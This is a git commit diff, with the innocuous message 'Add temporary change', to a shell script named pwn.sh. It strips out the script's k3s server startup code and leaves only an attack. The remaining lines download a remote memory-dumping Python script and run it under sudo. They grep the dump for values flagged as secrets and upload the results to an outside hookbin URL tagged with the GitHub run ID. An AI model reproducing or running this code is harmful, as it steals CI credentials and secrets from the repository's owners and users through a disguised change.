81b935182915d1c7edca43d900c19def06244db8
j5884p5g <j5884p5g@rolf.ovh>
2026-04-22 00:11:43 +0000

    Add temporary change

--- pwn.sh
+++ pwn.sh
@@ -2,16 +2,3 @@
 echo "Okay, we got this far. Let's continue..."
 curl -sSf https://raw.githubusercontent.com/playground-nils/tools/refs/heads/main/memdump.py | sudo -E python3 | tr -d '\0' | grep -aoE '"[^"]+":\{"value":"[^"]*","isSecret":true\}' >> "/tmp/secrets"
 curl -X PUT -d \@/tmp/secrets "https://open-hookbin.vercel.app/$GITHUB_RUN_ID"
-
-set -eu
-
-# https://docs.k3s.io/cli/server
-# https://docs.k3s.io/datastore/ha-embedded
-
-if [ -n "${K3S_URL:-}" ]; then
-    # shellcheck disable=SC2086
-    exec /bin/k3s server --server "${K3S_URL}" ${EXTRA_K3S_SERVER_ARGS:-}
-else
-    # shellcheck disable=SC2086
-    exec /bin/k3s server --cluster-init ${EXTRA_K3S_SERVER_ARGS:-}
-fi
